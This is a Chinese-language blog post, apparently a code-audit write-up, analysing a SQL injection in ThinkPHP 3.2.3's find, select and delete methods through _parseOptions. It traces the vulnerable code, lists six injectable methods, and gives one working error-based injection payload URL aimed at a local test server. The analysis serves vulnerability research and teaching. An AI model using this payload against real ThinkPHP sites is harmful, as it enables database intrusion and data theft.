@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="mjy6">
+
+
+    <meta name="subtitle" content="一个脚本小子的挣扎">
+
+
+
+    <meta name="keywords" content="网络安全">
+
+
+<title>代码审计 | Thinkphp3.2 find_delete_selete注入分析 | 安全之路</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">mjy6&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">mjy6&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">代码审计 | Thinkphp3.2 find_delete_selete注入分析</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">mjy6</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">九月 29, 2018&nbsp;&nbsp;9:15:41</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <hr>
+<p>##<strong>基础知识:</strong><br><img src="http://static.zybuluo.com/chhyx/lw29luk5t7su3s5qqqriv3fn/image_1coi47sfp1u5q6iruc7rtffoe6k.png" alt="image_1coi47sfp1u5q6iruc7rtffoe6k.png-74kB"><br>更多基础知识看:<br><a target="_blank" rel="noopener" href="https://p0rz9.github.io/2018/09/28/TP%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/">https://p0rz9.github.io/2018/09/28/TP框架数据操作</a></p>
+<p>##<strong>环境搭建:</strong><br>cms:<a target="_blank" rel="noopener" href="http://static.zybuluo.com/chhyx/ekxqnkhns953gzus9dk1qsig/image_1coju9t0q1b3dmm3109puv41ds49.png">Thinkphp3.2.3</a><br>下载后开启debug调试模式,方便测试。</p>
+<pre><code>#Application\Home\Controller\IndexController.class.php:
+&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller &#123;
+    public function index()&#123;
+        $Model = M(&#39;user&#39;);
+        $Model-&gt;find(I(&#39;get.id&#39;));
+        //$Model-&gt;select(I(&#39;get.id&#39;));
+        //$Model-&gt;delete(I(&#39;get.id&#39;));
+    &#125;
+&#125;
+?&gt;
+</code></pre>
+<p><code>select</code>、<code>delete</code>与<code>find</code>代码分析流程基本一样 这里就不再赘述 因为方法中都调用了有问题的<code>_parseOptions()</code>方法</p>
+<p>##<strong>漏洞利用：</strong><br>payload:</p>
+<pre><code>http://127.0.0.1:85/index.php/home/index/index?id[where]=id = 1 and updatexml(0,concat(0xa,user()),0)
+</code></pre>
+<p><img src="http://static.zybuluo.com/chhyx/vmaxbtyn92txy3ccoburcfmp/image_1coi3s5gvspqtpo1s1g1euq15e067.png" alt="image_1coi3s5gvspqtpo1s1g1euq15e067.png-81kB"></p>
+<p>##<strong>代码分析:</strong><br>相关变量已加到注释中<br>A.从<code>IndexController.class.php</code>开始分析</p>
+<pre><code>$Model-&gt;find(I(&#39;get.id&#39;));
+</code></pre>
+<p>B.跟进<code>Thinkphp\Library\Think\Model.class.php</code>的<code>find()</code>方法:</p>
+<pre><code>#Thinkphp\Library\Think\Model.class.php 722行
+public function find($options=array()) &#123;
+...
+// 总是查找一条记录
+$options[&#39;limit&#39;]   =   1;
+
+    // 分析表达式
+    $options            =   $this-&gt;_parseOptions($options);
+    //方法的核心 分析表达式 获取表名 获取字段
+
+    // 判断查询缓存
+    //无缓存
+...
+
+    $resultSet          =   $this-&gt;db-&gt;select($options);//在这里报错
+</code></pre>
+<p>进入_parseOptions()方法:</p>
+<pre><code>protected function _parseOptions($options=array()) &#123;
+if(is_array($options))
+    $options =  array_merge($this-&gt;options,$options);
+...
+// 表达式过滤
+$this-&gt;_options_filter($options);
+return $options;
+&#125;
+</code></pre>
+<p>进入<code>_parseOptions()</code>方法后,判断如果<code>$options</code>为数组 则直接拼接 下面的<code>_options_filter()</code>是个空方法 并无过滤<br>我们继续分析：</p>
+<pre><code>$resultSet       =   $this-&gt;db-&gt;select($options);
+</code></pre>
+<p>C.跟进<code>Thinkphp\Library\Think\Db\Driver.class.php</code>文件的<code>select()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/tdbbat7954ktp3f227xv32sr/image_1coi0lkg517g1ghqv331n9fj6o9.png" alt="image_1coi0lkg517g1ghqv331n9fj6o9.png-48.9kB"></p>
+<p>跟进生成<code>buildSelectSql()</code>方法:</p>
+<pre><code>public function buildSelectSql($options=array()) &#123;
+...
+$sql  =   $this-&gt;parseSql($this-&gt;selectSql,$options);
+return $sql;
+&#125;
+</code></pre>
+<p>跟进<code>parseSql()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/w5s7d3huryk02oimj6hn2cu6/image_1coi0q3fk1hh0jkiatc1oc515sm1m.png" alt="image_1coi0q3fk1hh0jkiatc1oc515sm1m.png-75.9kB"></p>
+<p>跟进<code>parseWhere()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/ekxqnkhns953gzus9dk1qsig/image_1coju9t0q1b3dmm3109puv41ds49.png" alt="image_1coju9t0q1b3dmm3109puv41ds49.png-19.3kB"></p>
+<p>传入的<code>$options[&#39;where&#39;]</code>的值为<code>string</code>类型时直接返回</p>
+<p>D.在<code>parseSql()</code>方法中 我们可以看到不仅仅<code>$where</code>我们可控 像其他的<code>table field order union</code>等 我们都是可以控制的:<br><img src="http://static.zybuluo.com/chhyx/px40iynyvtu30hk0kqywdv5n/image_1coi1gccr10g61jcvfk5stn6i35q.png" alt="image_1coi1gccr10g61jcvfk5stn6i35q.png-47.9kB"></p>
+<p>也就是说我们可以自己构造sql语句进行注入。</p>
+<p>E.经过分析,我们可得到造成漏洞的原因是<code>_parseOptions()</code>方法中直接拼接字符串导致的 我们搜一下这个方法的所有利用点:</p>
+<pre><code>_parseOptions($options)
+</code></pre>
+<p>搜了下整个框架,引入这个<code>_parseOptions()</code>的方法情况:<br>第一个参数可控时,可注入:</p>
+<pre><code>public function find($options=array())
+public function select($options=array())
+public function delete($options=array())
+</code></pre>
+<p>第二个参数可控时,可注入:</p>
+<pre><code>public function save($data=&#39;&#39;,$options=array())
+public function add($data=&#39;&#39;,$options=array(),$replace=false)
+public function addAll($dataList,$options=array(),$replace=false)
+</code></pre>
+<p>&#x2F;&#x2F;不将<code>$options</code>带入sql语句中,无法注入:</p>
+<pre><code>public function selectAdd($fields=&#39;&#39;,$table=&#39;&#39;,$options=array())
+</code></pre>
+<p>一共可利用的点有6处。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>mjy6</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2018/09/29/Thinkphp3.2%20find_delete_selete%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">http://example.com/2018/09/29/Thinkphp3.2%20find_delete_selete%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"># 代码审计</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2018/10/18/Thinkphp3.x_5.x%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/">代码审计 | Thinkphp3.x/5.x框架审计总结</a>
+            
+            
+            <a class="next" rel="next" href="/2018/09/25/thinkphp5.0.10%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%85%A8%E5%AF%BC%E8%87%B4%E4%B8%80%E5%A4%84%E7%9B%B2%E6%B3%A8/">代码审计 |  thinkphp5.0.10函数过滤不全导致一处盲注</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© mjy6 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
